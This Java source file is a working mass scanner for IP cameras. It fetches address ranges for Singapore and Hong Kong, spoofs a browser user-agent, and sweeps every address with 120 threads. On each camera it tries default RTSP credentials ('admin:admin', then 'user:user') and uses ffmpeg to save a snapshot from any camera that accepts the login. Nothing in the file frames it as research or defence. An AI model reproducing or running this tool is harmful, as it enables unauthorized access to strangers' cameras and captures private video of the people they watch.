import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.Callable;
import java.net.URL;
import java.net.URLConnection;
import java.net.InetAddress;
import java.nio.charset.Charset;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.File;
import java.io.FilenameFilter;

public class rtsp_nodb {

	public static void main(String[] args) {

        // create thread pool
        Integer threadSize = 120;
		ExecutorService executor = Executors.newFixedThreadPool(threadSize);

		// create result list
		Future[] futures = new Future[threadSize];

		// token variable
		Date tokenDate;
		SimpleDateFormat tokenFormat;
		String token;

		Boolean running = true;

		while(running) {

		// create token
		tokenDate = new Date();
		tokenFormat = new SimpleDateFormat("yyyyMMddHHmmss");
		token = tokenFormat.format(tokenDate);

	    // Create one directory
	    if ((new File("/home/frank/Downloads/ipcam/all/" + token)).mkdir()) {
	      System.out.println("Directory: /home/frank/Downloads/ipcam/all/" + token + " created");
	    } else {
			System.out.println("Fail to create directory: /home/frank/Downloads/ipcam/all/" + token + "");
		}

        // load URL
        try {
	        URL url = new URL("http://services.ce3c.be/ciprg/?countrys=SINGAPORE%2CHONG+KONG%2C&format=by+input&format2=%7Bstartip%7D%2C%7Bendip%7D%0D%0A");
			URLConnection spoof = url.openConnection();

			// spoof the connection so we look like a web browser
			spoof.setRequestProperty( "User-Agent", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0;    H010818)" );

			BufferedReader in = new BufferedReader(new InputStreamReader(spoof.getInputStream()));

			String strLine = "";
			String startAddr = "";
			String endAddr = "";
			String ip = "";
			String output = "";
			String output_ip = "";
			String output_link = "";
			String output_result = "";
			Long startInt, endInt;
			InetAddress bar, foo;
			boolean busy;

			// loop through every line in the source
			while ((strLine = in.readLine()) != null){

				startAddr = strLine.substring(0,strLine.indexOf(','));
				endAddr = strLine.substring(strLine.indexOf(',')+1);

				int successCount = 0;

				// skip this addr if in black list
				if( inBlackList(startAddr) ) {
					continue;
				}

				// Convert from an IPv4 address to an integer
				startInt = ipToLong(startAddr);
				endInt = ipToLong(endAddr);

				for(Long l = startInt; l < endInt; l++) {

					// Convert from integer to an IPv4 address
					ip = longToIp(l);

					//System.out.println(ip);

					// Set the busy
					busy = true;

					//Find free thread
					while(busy) {

						for(int i = 1; i < threadSize; i++) {

							if(futures[i] == null) {

								//System.out.println("Free Thread : " + i);

								futures[i] = executor.submit(new rtspTask(ip,token));

								busy = false;

								i = threadSize;

							} else {
								if(futures[i].isDone()) {

									//Get thread output, link,result
									output = (String)futures[i].get();
									output_ip = output.substring(0,output.indexOf('~'));
									output = output.substring(output.indexOf('~')+1);
									output_link = output.substring(0,output.indexOf('~'));
									output_result = output.substring(output.indexOf('~')+1);

									if(output_result.indexOf("Success") > -1) {
										successCount = successCount + 1;
									}

									futures[i] = executor.submit(new rtspTask(ip,token));

									busy = false;

									i = threadSize;

								}

							}

						}

						Thread.sleep(10);

					}

				}

				System.out.println(startAddr + " " + endAddr + " " + String.valueOf(successCount));

			}
        } catch (Exception e) {
        	System.out.println(e.getMessage());
		}

		running = false;

		}

		executor.shutdown();


	}

	public static long ipToLong(String ipAddress) {

		String[] ipAddressInArray = ipAddress.split("\\.");

		long result = 0;
		for (int i = 0; i < ipAddressInArray.length; i++) {

			int power = 3 - i;
			int ip = Integer.parseInt(ipAddressInArray[i]);
			result += ip * Math.pow(256, power);

		}

		return result;
	}

	public static String longToIp(long ip) {

		StringBuilder result = new StringBuilder(15);

		for (int i = 0; i < 4; i++) {

			result.insert(0,Long.toString(ip & 0xff));

			if (i < 3) {
				result.insert(0,'.');
			}

			ip = ip >> 8;
		}

		return result.toString();
	}

	public static Boolean inBlackList(String ip) {

		String[] blackListArray = {
			"1.32.128.0",
			"1.32.192.0",
			"8.128.0.0",
			"8.208.0.0",
			"14.1.28.0",
			"14.1.112.0"
		};

		for( String blackList : blackListArray) {

			if( blackList.equals(ip) ) {
				return true;
			}

		}

		return false;

	}

}

class rtspTask implements Callable<String> {

	private String ip;
	private String token;

	public rtspTask (String ip, String token) {

		this.ip = ip;
		this.token = token;

	}

	@Override
	public String call() throws Exception{

		//System.out.println(Thread.currentThread().getName() + " Begins Work  " + id);
		//Process p;
		//StringBuffer output = new StringBuffer();

		String user, pw, req, link, file, rtspCmd, result;

		rtspCmd = "";
		user = "admin";
		pw = "admin";
		req = "2";
		file = "/home/frank/Downloads/ipcam/all/"+token+"/"+ip+".jpeg";
		link = "rtsp://"+user+":"+pw+"@"+ip+"/"+req;

		rtspCmd = "ffmpeg -stimeout 1500000 -i "
			+link+" "
			+"-f image2 -vframes 1 -y "
			+"/home/frank/Downloads/ipcam/all/"+ip+".jpeg 2>&1";

		result = captureCmd(link, file);

		if(result.indexOf("401 Unauthorized") > -1) {
			user = "user";
			pw = "user";
			link = "rtsp://"+user+":"+pw+"@"+ip+"/"+req;
			result = captureCmd(link, file);
		}

		/*
		if(result.indexOf("400 Bad Request") > -1) {
			user = "admin";
			pw = "12345";
			req = "MediaInput/h264";
			link = "rtsp://"+user+":"+pw+"@"+ip+"/"+req;
			result = captureCmd(link, file);
		}
		*/

		return ip + "~" + link + "~" + result;
	}

	public String captureCmd(String link, String file) throws Exception {

		Process processDuration = new ProcessBuilder("ffmpeg","-stimeout","2000000","-i",link,"-f","image2","-vframes","1","-y",file).redirectErrorStream(true).start();
		StringBuilder strBuild = new StringBuilder();
		try (BufferedReader processOutputReader = new BufferedReader(new InputStreamReader(processDuration.getInputStream(), Charset.defaultCharset()));) {
		    String line;
		    while ((line = processOutputReader.readLine()) != null) {
		        strBuild.append(line + System.lineSeparator());
		    }
		    processDuration.waitFor();
		}

		return checkResult(strBuild.toString());
	}

	public String checkResult(String output) {
		String result = "";

		if(output.indexOf("Connection timed out") > -1) {
			result = "Connection timeout";		//Host offline
		} else if(output.indexOf("Connection refused") > -1) {
			result = "Connection refused";		//Host online but no RSTP
		} else if(output.indexOf("400 Bad Request") > -1) {
			result = "400 Bad Request";			//RTSP ok but bad request
		} else if(output.indexOf("401 Unauthorized") > -1) {
			result = "401 Unauthorized";			//RTSP & request ok but incorrect password
		} else if(output.indexOf("Invalid data found") > -1) {
			result = "Invalid data found"; 		//Invalid data found
		} else if(output.indexOf("Output #0, image2, to") > -1) {
			result = "Success"; 					//Connect success
		}

		return result;
	}

}
